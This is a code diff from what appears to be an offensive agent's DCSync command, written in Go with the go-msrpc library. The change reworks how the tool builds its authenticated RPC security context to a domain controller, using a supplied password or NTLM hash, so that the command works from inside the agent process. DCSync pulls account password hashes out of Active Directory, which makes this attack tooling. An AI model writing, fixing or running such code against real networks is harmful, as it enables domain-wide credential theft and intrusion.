@@ -1,7 +1,6 @@
 package commands
 
 import (
-	"context"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
@@ -19,7 +18,6 @@ import (
 	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
 	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
 	"github.com/oiweiwei/go-msrpc/ndr"
-	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
 
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
 )
@@ -99,20 +97,15 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: no valid target accounts specified")
 	}
 
-	// Set up credentials — use global registration (matching official drsr example).
-	// Per-context credentials fail in the agent context due to security context
-	// state interference from other command init() registrations.
+	// Set up credentials using per-context pattern (matching coerce PrinterBug
+	// which also uses TCP+EPM+WithSeal and works from the agent process).
 	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
 	}
-	gssapi.AddCredential(cred)
 
-	ctx, cancel := context.WithTimeout(
-		gssapi.NewSecurityContext(context.Background()),
-		time.Duration(args.Timeout)*time.Second,
-	)
+	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)
 	defer cancel()
 
 	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
